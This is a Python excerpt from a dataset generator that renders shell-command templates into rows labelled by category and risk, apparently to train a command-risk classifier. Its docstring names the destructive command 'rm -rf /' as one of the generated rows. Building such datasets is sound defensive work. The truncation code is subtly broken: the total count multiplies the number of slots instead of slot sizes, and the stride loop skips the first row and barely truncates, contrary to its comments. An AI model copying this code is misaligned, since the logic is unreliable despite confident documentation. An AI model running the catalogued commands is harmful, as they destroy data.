def _iter_rule(rule: Rule) -> Iterator[str]:
    """Render one rule's cartesian product, deterministically truncated.

    Determinism matters more than optimality here: ``build_dataset.py`` must
    produce the same corpus from the same commit, because CI re-runs the pipeline
    and asserts the exported model is byte-identical. So this truncates by
    stride rather than sampling.
    """
    if not rule.slots:
        yield rule.template
        return

    names = list(rule.slots)
    combos = itertools.product(*(rule.slots[name] for name in names))
    total = 1
    for values in combos:
        total *= len(values)

    if total <= rule.limit:
        for values in itertools.product(*(rule.slots[name] for name in names)):
            yield rule.template.format(**dict(zip(names, values, strict=True)))
        return

    # Stride sampling keeps the cartesian structure (so every slot value still
    # appears) while staying reproducible and order-independent.
    stride = total / rule.limit
    previous_bucket = 0
    for index, values in enumerate(
        itertools.product(*(rule.slots[name] for name in names))
    ):
        bucket = int(index * stride)
        if bucket == previous_bucket:
            continue
        previous_bucket = bucket
        yield rule.template.format(**dict(zip(names, values, strict=True)))


def generate() -> list[Generated]:
    """Render every rule.

    Returns:
        Deduplicated rows. Duplicate suppression is essential: several rules
        overlap (``rm -rf /`` is reachable from more than one template), and a
        repeated row inflates whichever class it belongs to.

    Raises:
        AssertionError: if any rendered command is blank, or if a category named
            by a rule does not exist in the taxonomy. Both would mean the
            generator and the label schema have drifted apart.
    """
    known = {category.name for category in CATEGORIES}
    rows: list[Generated] = []
    seen: set[str] = set()

    for rule in _RULES:
        if rule.category not in known:
            raise AssertionError(f"rule references unknown category {rule.category!r}")
        for command in _iter_rule(rule):
            cleaned = command.strip()
            assert cleaned, "rule rendered an empty command"
            if cleaned in seen:
                continue
            seen.add(cleaned)
            rows.append(
                Generated(command=cleaned, category=rule.category, risk=rule.risk)
            )

    return rows


